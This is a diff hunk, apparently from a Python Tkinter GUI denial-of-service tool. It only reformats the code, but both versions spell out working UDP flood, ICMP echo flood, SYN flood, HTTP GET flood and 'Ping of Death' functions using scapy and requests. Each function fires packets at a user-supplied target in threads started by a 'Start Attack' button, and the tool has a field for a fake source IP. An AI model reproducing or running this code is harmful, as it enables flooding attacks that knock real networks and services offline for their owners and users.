@@ -78,107 +78,126 @@ attack_type_entry = tk.StringVar(root)
 attack_type_entry.set("UDP Flood")  # Default attack type
 
 attack_type_options = [
-    "UDP Flood",
-    "ICMP Echo",
-    "SYN Flood",
-    "HTTP Flood",
-    "Ping of Death"
+    "UDP Flood", "ICMP Echo", "SYN Flood", "HTTP Flood", "Ping of Death"
 ]
 
 attack_type_menu = tk.OptionMenu(root, attack_type_entry, *attack_type_options)
 attack_type_menu.pack()
 
+
 # Define the attack functions for each attack type
 def udp_flood_attack(target, port, num_packets, burst_interval):
-    global attack_num
+  global attack_num
 
-    try:
-        for _ in range(num_packets):
-            scapy.send(scapy.IP(dst=target)/scapy.UDP(dport=port)/scapy.RandString(1024))
-            attack_num += 1
-            port = (port + 1) % 65535
-            print(f"Sent {attack_num} packet to {target} through port: {port}")
-            time.sleep(burst_interval)
-    except Exception as e:
-        print("An error occurred during the UDP flood attack:", e)
+  try:
+    for _ in range(num_packets):
+      scapy.send(
+          scapy.IP(dst=target) / scapy.UDP(dport=port) /
+          scapy.RandString(1024))
+      attack_num += 1
+      port = (port + 1) % 65535
+      print(f"Sent {attack_num} packet to {target} through port: {port}")
+      time.sleep(burst_interval)
+  except Exception as e:
+    print("An error occurred during the UDP flood attack:", e)
+
 
 def icmp_echo_attack(target, num_packets, burst_interval):
-    global attack_num
+  global attack_num
 
-    try:
-        for _ in range(num_packets):
-            scapy.send(scapy.IP(dst=target)/scapy.ICMP())
-            attack_num += 1
-            print(f"Sent {attack_num} ICMP echo request to {target}")
-            time.sleep(burst_interval)
-    except Exception as e:
-        print("An error occurred during the ICMP echo attack:", e)
+  try:
+    for _ in range(num_packets):
+      scapy.send(scapy.IP(dst=target) / scapy.ICMP())
+      attack_num += 1
+      print(f"Sent {attack_num} ICMP echo request to {target}")
+      time.sleep(burst_interval)
+  except Exception as e:
+    print("An error occurred during the ICMP echo attack:", e)
+
 
 def syn_flood_attack(target, port, num_packets, burst_interval):
-    global attack_num
+  global attack_num
 
-    try:
-        for _ in range(num_packets):
-            scapy.send(scapy.IP(dst=target)/scapy.TCP(dport=port, flags="S"))
-            attack_num += 1
-            port = (port + 1) % 65535
-            print(f"Sent {attack_num} SYN packet to {target} through port: {port}")
-            time.sleep(burst_interval)
-    except Exception as e:
-        print("An error occurred during the SYN flood attack:", e)
+  try:
+    for _ in range(num_packets):
+      scapy.send(scapy.IP(dst=target) / scapy.TCP(dport=port, flags="S"))
+      attack_num += 1
+      port = (port + 1) % 65535
+      print(f"Sent {attack_num} SYN packet to {target} through port: {port}")
+      time.sleep(burst_interval)
+  except Exception as e:
+    print("An error occurred during the SYN flood attack:", e)
+
 
 def http_flood_attack(target, port, num_packets, burst_interval):
-    global attack_num
+  global attack_num
 
-    try:
-        url = f"http://{target}:{port}/"
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
+  try:
+    url = f"http://{target}:{port}/"
+    headers = {
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+    }
 
-        for _ in range(num_packets):
-            requests.get(url, headers=headers)
-            attack_num += 1
-            print(f"Sent {attack_num} HTTP request to {url}")
-            time.sleep(burst_interval)
-    except Exception as e:
-        print("An error occurred during the HTTP flood attack:", e)
+    for _ in range(num_packets):
+      requests.get(url, headers=headers)
+      attack_num += 1
+      print(f"Sent {attack_num} HTTP request to {url}")
+      time.sleep(burst_interval)
+  except Exception as e:
+    print("An error occurred during the HTTP flood attack:", e)
+
 
 def ping_of_death_attack(target, num_packets, burst_interval):
-    global attack_num
+  global attack_num
 
-    try:
-        for _ in range(num_packets):
-            scapy.send(scapy.IP(dst=target)/scapy.ICMP()/("X"*60000))
-            attack_num += 1
-            print(f"Sent {attack_num} oversized ICMP packet to {target}")
-            time.sleep(burst_interval)
-    except Exception as e:
-        print("An error occurred during the Ping of Death attack:", e)
+  try:
+    for _ in range(num_packets):
+      scapy.send(scapy.IP(dst=target) / scapy.ICMP() / ("X" * 60000))
+      attack_num += 1
+      print(f"Sent {attack_num} oversized ICMP packet to {target}")
+      time.sleep(burst_interval)
+  except Exception as e:
+    print("An error occurred during the Ping of Death attack:", e)
+
 
 # Define the function to start the attack
 def start_attack():
-    target = target_entry.get()
-    fake_ip_entry.get()
-    port = int(port_entry.get())
-    num_packets = int(num_packets_entry.get())
-    burst_interval = float(burst_interval_entry.get())
+  target = target_entry.get()
+  fake_ip_entry.get()
+  port = int(port_entry.get())
+  num_packets = int(num_packets_entry.get())
+  burst_interval = float(burst_interval_entry.get())
 
-    attack_type = attack_type_entry.get()  # Get the selected attack type from the GUI
+  attack_type = attack_type_entry.get(
+  )  # Get the selected attack type from the GUI
 
-    if attack_type == "UDP Flood":
-        attack_thread = threading.Thread(target=udp_flood_attack, args=(target, port, num_packets, burst_interval))
-    elif attack_type == "ICMP Echo":
-        attack_thread = threading.Thread(target=icmp_echo_attack, args=(target, num_packets, burst_interval))
-    elif attack_type == "SYN Flood":
-        attack_thread = threading.Thread(target=syn_flood_attack, args=(target, port, num_packets, burst_interval))
-    elif attack_type == "HTTP Flood":
-        attack_thread = threading.Thread(target=http_flood_attack, args=(target, port, num_packets, burst_interval))
-    elif attack_type == "Ping of Death":
-        attack_thread = threading.Thread(target=ping_of_death_attack, args=(target, num_packets, burst_interval))
-    else:
-        print("Invalid attack type selected.")
-        return
+  if attack_type == "UDP Flood":
+    attack_thread = threading.Thread(target=udp_flood_attack,
+                                     args=(target, port, num_packets,
+                                           burst_interval))
+  elif attack_type == "ICMP Echo":
+    attack_thread = threading.Thread(target=icmp_echo_attack,
+                                     args=(target, num_packets,
+                                           burst_interval))
+  elif attack_type == "SYN Flood":
+    attack_thread = threading.Thread(target=syn_flood_attack,
+                                     args=(target, port, num_packets,
+                                           burst_interval))
+  elif attack_type == "HTTP Flood":
+    attack_thread = threading.Thread(target=http_flood_attack,
+                                     args=(target, port, num_packets,
+                                           burst_interval))
+  elif attack_type == "Ping of Death":
+    attack_thread = threading.Thread(target=ping_of_death_attack,
+                                     args=(target, num_packets,
+                                           burst_interval))
+  else:
+    print("Invalid attack type selected.")
+    return
 
-    attack_thread.start()
+  attack_thread.start()
+
 
 # Create the start attack button
 tk.Button(root, text="Start Attack", command=start_attack).pack()
